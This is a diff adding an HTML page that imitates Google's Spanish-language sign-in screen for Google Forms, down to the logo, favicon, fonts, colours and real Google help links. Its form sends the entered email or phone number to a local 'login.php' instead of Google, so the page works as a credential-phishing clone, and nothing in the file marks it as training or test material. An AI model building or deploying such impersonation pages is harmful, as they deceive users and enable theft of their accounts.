@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Zen+Kaku+Gothic+Antique&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans&display=swap" rel="stylesheet">
+    <!-- <link rel="stylesheet" href="./estilos.css"> -->
+    <link rel="icon" type="image/png" href="./Google-favicon.png" />
+    <title>Formularios de Google: inicio de sesión</title>
+    <style>
+        *{
+            padding:0;
+            margin:0;
+        }
+
+        a {
+            text-decoration: none;
+        }
+        
+
+        body{
+            min-height: 100vh;
+            display: grid;
+            justify-content: center;
+            align-items: center;
+            font-family: roboto, "zen kaku gothic antique", sans-serif;
+        }
+
+        .inputContainer{
+            max-width: 22rem;
+            border: 1px solid lightgray;
+            border-radius: 8px;
+            padding: 55px 50px 40px 50px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .login{
+            margin-top: 20px;
+            margin-bottom: 5px;
+            font-weight: lighter;
+            font-family: "Google Sans";
+        }
+
+        .use{
+            font-weight: lighter;
+        }
+
+        input::placeholder {
+            font-size: 16px;
+            font-family: "Roboto";
+            font-weight: 500;
+        }  
+
+        .gInput{
+            width: 100%;
+            height: 3.5rem;
+            margin-top: 50px;
+            border: 0.5px solid lightgray;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 400;
+            padding: 0 0 0 15px;
+            background-color: none;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .gInput:focus{
+            border: 2px solid #4285f4;
+        }
+
+        .gInput:focus ~ .inputLabel:before{
+            color: #4285f4;
+            font-size: 12px;
+            top: -65px;
+            z-index: 1;
+        }
+
+        .inputLabel{
+            position: relative;
+            width: 200px;
+        }
+
+        input:focus::placeholder {
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .inputLabel:before{
+            content: "Correo electrónico o teléfono";
+            position: relative;
+            top: -25px;
+            left: 10px;
+            background-color: white;
+            font-size: 18px;
+            z-index: -1;
+            font-weight: lighter;
+            padding: 0 10px;
+            box-sizing: border-box;
+            transition: 0.1s ease;
+        }
+
+        .forgotContainer{
+            width: 100%;
+            display: flex;
+            justify-content: flex-start;
+            margin-top: 10px;
+        }
+
+        .guest{
+            margin-top: 35px;
+            margin-bottom: 35px;
+            font-size: 13px;
+            font-weight: lighter;
+        }
+
+        span{
+            font-weight: bold;  
+        }
+
+        .masInfo:hover{
+            box-shadow: 0 1px 1px 0 rgba(66,133,244,.45),0 1px 3px 1px rgba(66,133,244,.3);
+            margin: 0 -3px;
+            padding: 0 3px;
+            border-radius: 4px;
+            outline: 0;
+            font-weight: bold;
+            color: #1a73e8;
+        }
+
+        .buttonContainer{
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+        }
+
+        .btnCreate{
+            position: relative;
+            margin-left: -14px;
+        }
+
+        .buttonContainer a{
+            text-decoration: none;
+            font-weight: 500;
+            font-size: .875rem;
+            border-radius: 5px;
+            padding: 7px 15px 9px 15px;
+        }
+
+            .btnCreate:hover{
+                color: #366fca;
+                background-color: #f6f9fe;
+            }
+
+            .btnNext{
+                font-family: "Google Sans";
+                background-color: #1a73e8;
+                color: white;
+                transition: 0.1s ease;
+                font-weight: 500;
+            }
+
+            .btnNext:hover{
+                background-color: #1b66c9;
+                box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            }
+
+        .forgot{
+            position: relative;
+            margin-top: -20px;
+            font-size: 13px;
+        }
+
+        .forgot, .guest span, .btnCreate{
+            color: #4285f4;
+            font-weight: bold;
+        }
+
+        .guest, .inputLabel:before{
+            color: #5f6368;
+        }
+
+        button {
+            border: none;
+            background-color: transparent;
+            color: inherit;
+            text-decoration: none;
+            box-shadow: none;
+            cursor: pointer;
+        }
+
+    </style>
+</head>
+<body>
+    <main class="inputContainer">
+        <img src="./google.png" alt="" width="87" height="33">
+        <h2 class="login">Iniciar sesión</h2>
+        <h4 class="use">Ir a Formularios</h4>
+        <form action="login.php" method="POST">
+            <input type="text" name="usuario" class="gInput" placeholder="Correo electrónico o teléfono">
+            <label class="inputLabel"></label>
+            <div class="forgotContainer">
+                <a href="https://accounts.google.com/signin/v2/usernamerecovery" onclick="this.target='_blank'"><h5 class="forgot">¿Has olvidado tu correo electrónico?</h5></a>
+            </div>
+            <h4 class="guest">¿No es tu ordenador? Usa una ventana privada para iniciar sesión. <a href="https://support.google.com/accounts?p=signin_privatebrowsing&amp;hl=es" onclick="this.target='_blank'"><span class="masInfo">Más información</span></a></h4>
+            <div class="buttonContainer">
+                <a href="https://accounts.google.com/signup/v2/webcreateaccount" class="btnCreate">Crear cuenta</a>
+                <a href="./login.php" class="btnNext"><button type="submit" class="btnNext">Siguiente</button></a>
+            </div>
+        </form>
+    </main>
+</body>
+</html>
